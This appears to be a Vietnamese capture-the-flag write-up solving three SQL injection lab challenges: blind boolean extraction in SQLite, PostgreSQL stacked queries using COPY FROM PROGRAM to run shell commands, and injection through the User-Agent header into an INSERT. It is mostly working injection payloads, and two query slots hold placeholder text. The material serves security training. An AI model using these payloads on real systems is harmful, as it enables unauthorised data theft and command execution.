# Mục Lục
- [Simple Blind SQL Injection](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/cookieArena.md#1-simple-blind-sql-injection)
- [Baby SQL Injection to RCE](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/cookieArena.md#2-baby-sql-injection-to-rce)
- [Blind Logger Middleware](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/cookieArena.md#3-blind-logger-middleware)
------------
# 1. Simple Blind SQL Injection

## Đầu bài cho biết
- Lấy mật khẩu của `admin`, sau đấy vào `/login` để lấy flag
- Trường mật khẩu gồm từ a-z, 0-9 và _
- cột `upw`

## Giải

![image](https://github.com/user-attachments/assets/e1d35a2f-51e1-4150-a4c8-f48f13411677)

- Đầu tiên với giao diện có 1 trường nhập UID và 1 truy vấn viết phía bên trên là `SELECT * FROM users WHERE uid='';`
- Thử nhập `admin` vào

![image](https://github.com/user-attachments/assets/5da2f3d6-39cd-47e1-b14d-d2edd088a1f8)

- Thử với uid khác `haha`

![image](https://github.com/user-attachments/assets/144f8979-b72c-4b32-b0f5-3b08d53942db)

- Có thể thấy chức năng này là kiểm tra uid nhập vào là có tồn tại trong database hay không.
- Thử với `'` và `''` thì `''` cho kết quả `not found` còn `'` báo lỗi như này:

![image](https://github.com/user-attachments/assets/a7dc3ce9-4a4d-48e5-8cb3-92347cdd0cfd)

- Chú ý vào `nrows = 1 if query_db("SELECT * FROM users WHERE uid ='%s'" % uid, one=True) else 0`, thì có thể hiểu là nó sẽ lấy thông tin được vào ô `UID` và chèn trực tiếp vào truy vấn SQL, nó bị lỗi vì thừa dấu `'` trong truy vấn làm hỏng cú pháp
- Từ việc chèn trực tiếp đó cùng với thông tin thông báo `exists`, `not found` có thể chắc chắn đấy là Boolean SQLi

- Đầu tiên, thử nhập vào với: `admin' AND 1=1 --`

![image](https://github.com/user-attachments/assets/2069767c-2547-4028-9f61-d2d3eca14e98)

- Thử số cột có trong bảng `users`: `admin' ORDER BY 1 --`, khi thử đến 4 thì có lỗi xảy ra

![image](https://github.com/user-attachments/assets/f57a18cb-b9bb-4229-996f-52872e72fb9e)

- Vậy bảng `users` này có 3 cột
- Biết: 
    + Bảng: users
    + Column: uid, upw, NULL
- Bây giờ cần đi tìm cột này để xác định xem có phải là cột password hay không?
- Với sqlite thì ta có thể thử dùng `name` với `PRAGME_TABLE_INFO(users)` để lấy tên các cột trong bảng (Cái này em hỏi GPT chứ không biết kiếm ở đâu 🤡)
- `admin' AND (SELECT name FROM PRAGMA_TABLE_INFO('users') LIMIT 1) = 'uid' --`

![image](https://github.com/user-attachments/assets/274bb17c-cf12-4e49-8221-f13ee8dbd711)

- Cột đầu tiên không phải là `uid`, ta đổi qua cột khác bằng cách thêm `OFFSET 1`

![image](https://github.com/user-attachments/assets/890ccf2b-d540-45a3-82e5-ec5228c27d48)

![image](https://github.com/user-attachments/assets/a91d28c0-54f6-42ad-bcf3-debca4ac1a7e)

- Vậy cột đầu là cột cần tìm
- Xem độ dài tên cột này rồi Brute Force ra thui:
- Thử độ dài: `admin' AND (SELECT LENGTH(name) FROM PRAGMA_TABLE_INFO('users') LIMIT 1 OFFSET 0) = 3 --`

![image](https://github.com/user-attachments/assets/92138a38-5eb8-4a35-bec9-4367a4c16750)

- Dùng SUBSTRING() để Brute Force ra: `admin' AND (SELECT SUBSTRING(name, 1, 1) FROM PRAGMA_TABLE_INFO('users') LIMIT 1 OFFSET 0) = 'a' --`

![image](https://github.com/user-attachments/assets/43e68417-cea6-4da2-b6a2-25f9b96c675c)

- Ta được tên cột là `idx`, trong 3 cột thì cái có khả năng là mật khẩu nhất là `upw`
- Ta thử lấy thông tin của `upw` với `uid = admin`: `admin' AND (SELECT SUBSTRING(upw, 1, 1) FROM users WHERE uid = 'admin') = 'a' --`
- Rồi lại đưa lên Intruder để Brute Force nó

![image](https://github.com/user-attachments/assets/4b65567c-b760-4e75-b342-5e17ab96d7eb)

- Chuyển qua `/login` và đăng nhập với username = `admin` và pass = `y0u_4r3_4dm1n`

![image](https://github.com/user-attachments/assets/541b7fba-906d-4bc4-b231-9bed994354f8)

# 2. Baby SQL Injection to RCE

## Đầu bài cho biết
- Challenge đang chạy với PostgreSQL and PHP.
- Flag File: /flagXXXX.txt

## Hint
- Sử dụng Stacked Query: là việc có thể sử dụng nhiều câu truy vấn bằng cách ngăn cách giữa các câu truy vấn bằng dấu ';'

![image](https://github.com/user-attachments/assets/fca0de01-a3f1-463c-b405-30f503ab6a75)

## Giải

![image](https://github.com/user-attachments/assets/c6daf554-ff8e-498f-9ff7-d7bc60b5aee9)

- `'OR 1=1 --` có thể khai thác được lỗ hổng SQL ở đây

![image](https://github.com/user-attachments/assets/99efbf7f-791c-468a-8585-822bcb9dab15)

- Mục tiêu của mình là dựa vào lỗ hổng này để tìm và mở được 1 file là `flagXXXX.txt` và lấy flag trong file đó
- Quan sát thì thấy, khi nhập username hoặc pass thì nó chỉ có 2 trường hợp xảy ra:

![image](https://github.com/user-attachments/assets/a03a8305-8809-4770-ad28-b7f77d5f245a)
![image](https://github.com/user-attachments/assets/362232fe-47e6-4aa4-b134-707a9e32e0b9)

- Ở đây khá chắc là Boolean SQli
- Vì ở đây nó không cho ta biết được kết quả của chuỗi truy vấn nên ta không thể trực tiếp chèn các hàm như `pg_read_file()`, `cat` đêr trực tiếp đọc file này. Mặt khác, ta cũng không có tên của file flag để đọc 😃
- Vậy là bây giờ cần:
    + Tạo ra 1 bảng mới
    + Lấy tên tất cả các file đưa vào bảng mới tạo
    + Dùng cách dò đúng sai để biết được các tên file flag cần tìm
- Tạo bảng mới: `admin'; CREATE TABLE abc(aaa text);--`
    + ![image](https://github.com/user-attachments/assets/32ade69b-5395-4239-943b-c3e676a737ad)
    + Gửi lại lần 2 để xác nhận bảng `abc` đã tồn tại
- Đưa tất cả tên file vào trong bảng `abc` vừa tạo: `admin'; COPY abc FROM PROGRAM 'ls / -m';--` (Với `ls / -m`) để đưa tất cả tên file vào 1 dòng duy nhất
- Brute force từng chữ: `admin' OR (SELECT SUBSTRING(aaa,1,1) FROM abc LIMIT 1) = 'a'--`
    + Nếu ra `Welcome, admin...` thì là đúng
    + Ra `Invalid username or password!` thì ký tự đó sai
- Đưa vào Intruder:
![image](https://github.com/user-attachments/assets/f72ef139-71ac-4093-a639-c2c6a3b3b337)

- Vậy là ta kiếm được tên file là `flags3JDE.txt`
- Tương tự với cách trên, ta tạo 1 bảng chứa nội dung của file `flags3JDE.txt`
    + `'; CREATE TABLE efg(sss text);--`
    + `'; COPY efg FROM PROGRAM 'cat /flags3JDE.txt';--`
    + Rồi tương tự dùng brute force để đọc lại bảng `efg`: `' OR (SELECT SUBSTRING(sss,1,1) FROM efg LIMIT 1) = 'a'--`

----------------------------
### Script python:
- [Tìm tên file](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Baby_SQL_Injection_to_RCE_1.py)
- [In flag](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Baby_SQL_Injection_to_RCE_2.py)
----------------------------


# 3. Blind Logger Middleware

## Đầu bài cho biết:
```sql
INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at)
VALUES ('{ip_address}', '{user_agent}', '{referer}', '{url}', '{cookie}', '{created_at}');
```
- Có một hàm được triển khai để "làm sạch" (sanitize) đầu vào của người dùng, loại bỏ các ký tự đặc biệt trước khi chèn chúng vào truy vấn SQL
- SQLite

## Giải
- Trong câu lệnh INSERT kia có các thành phần là `ip_address`, `user_agent`, `referer`, `url`, `cookie`, `created_at`. Để ý đến `user_agent` có trong request gửi đi, nên em nghĩ mình có thể attack từ đây.
- Sửa `User-Agent` thành: `', null, null, null, null),(null,'`
- Khi đó truy vấn gửi đi sẽ là:
``` sql
INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at)
VALUES ('{ip_address}', '{user_agent}', null, null, null, null), (null,'', '{referer}', '{url}', '{cookie}', '{created_at}');
```
- Như vậy nó sẽ thành gửi đi 2 bộ giá trị.

![image](https://github.com/user-attachments/assets/39f96a09-d136-47c1-adc1-6b3db8efa3d6)

- Thử giá trị NULL kia, thì nó ở dạng số hoặc string.
- Từ đây em muốn sử dụng Boolean để đoán ra từng ký tự có trong flag.
- Đầu tiên, tìm kiếm tên bảng với truy vấn này và [script này](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Blind_Logger_Middleware_tables.py)

`', (SELECT CASE WHEN substr((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0), 1, 1) = 'a' THEN 1 ELSE abs(-9223372036854775808) END), null, null, null),(null,'`

![image](https://github.com/user-attachments/assets/e728ddf4-b962-4673-8e14-1585ba36baf4)

- Có 2 bảng là `logger` và `flag`
- Khai thác bảng `flag` với truy vấn và script này

`aaaaaaa`

![image](https://github.com/user-attachments/assets/4214545f-1e10-4b4f-b677-d8196c50a05e)

- Vậy là có 2 cột là: `id` và `secret`

- Tiếp tục khai thác cột `secret` để tìm flag có trong cột bằng truy vấn và script này

`dfsfsfs`

![image](https://github.com/user-attachments/assets/08051c0e-6683-4ebe-8e9b-f168a8a32fa7)

- Lấy được flag: `CHH{blInD_sqLi_1N_UPDATE}`












